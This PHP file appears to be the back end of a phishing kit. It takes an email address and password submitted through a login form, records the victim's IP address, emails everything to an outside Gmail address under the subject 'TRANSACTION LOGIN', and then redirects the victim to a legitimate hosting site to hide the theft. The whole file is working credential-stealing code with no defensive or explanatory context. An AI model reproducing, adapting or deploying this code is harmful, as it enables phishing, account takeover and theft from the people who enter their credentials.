<?

$ip = getenv("REMOTE_ADDR");
$message .= "------------------------------------------------------------------\n";
$message .= "Email ID: ".$_POST['Email']."\n";
$message .= "Password: ".$_POST['emailpassword']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By Lord PoPpA-----------------------------\n";



$recipient = "juwonlo7@gmail.com";
$subject = "TRANSACTION LOGIN";
$headers = "From: DOMAIN";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: https://www.bluehost.com/");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>